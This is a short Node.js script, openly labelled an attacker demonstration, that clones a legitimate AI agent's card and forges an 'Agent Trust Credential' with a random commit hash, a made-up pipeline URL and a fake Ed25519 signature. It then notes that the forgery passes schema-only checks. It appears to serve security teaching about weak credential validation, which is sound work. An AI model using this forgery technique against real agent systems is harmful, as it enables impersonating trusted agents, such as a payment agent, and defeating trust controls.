const fs = require("fs");
const crypto = require("crypto");

// ATTACKER SCRIPT: Forges an Agent Trust Credential by cloning a legitimate agent card
// and fabricating build attestation. This demonstrates the attack, not the vulnerable server.

// Step 1: Clone the legitimate agent's publicly-accessible agent card
const legitimateCard = JSON.parse(fs.readFileSync("agent-card.json", "utf-8"));
console.log(`[FORGE] Cloned agent card for: ${legitimateCard.name}`);

// Step 2: Create a forged ATC with fake attestation
const forgedATC = {
  version: "1.0",
  agentId: legitimateCard.name,
  publisher: legitimateCard.publisher,
  trustLevel: legitimateCard.capabilities.trustLevel,
  capabilities: legitimateCard.capabilities.tasks,
  issuedAt: new Date().toISOString(),
  expiresAt: new Date(Date.now() + 86400000).toISOString(),

  // FORGED: Fabricated build attestation
  attestation: {
    buildSystem: "github-actions",
    repository: legitimateCard.attestation.repository,
    commitHash: crypto.randomBytes(20).toString("hex"), // Fake commit hash
    pipelineUrl: `https://github.com/finsecure/payment-agent/actions/runs/${Date.now()}`,
    buildTimestamp: new Date().toISOString(),
  },

  // FORGED: Fake cryptographic signature
  // The attacker generates a signature with their own key, not the legitimate signing key
  signature: {
    algorithm: "Ed25519",
    publicKey: crypto.randomBytes(32).toString("base64"), // Attacker's key, not the real one
    value: crypto.randomBytes(64).toString("base64"), // Random bytes, not a real signature
  },
};

console.log(`[FORGE] Created forged ATC:`);
console.log(JSON.stringify(forgedATC, null, 2));

// Step 3: Save the forged ATC for use by the attacker's agent
fs.writeFileSync("forged-atc.json", JSON.stringify(forgedATC, null, 2));
console.log(`[FORGE] Saved to forged-atc.json`);
console.log(`[FORGE] This ATC will pass schema validation but has a fake signature.`);
console.log(`[FORGE] If the consuming agent only checks schema, the forgery succeeds.`);
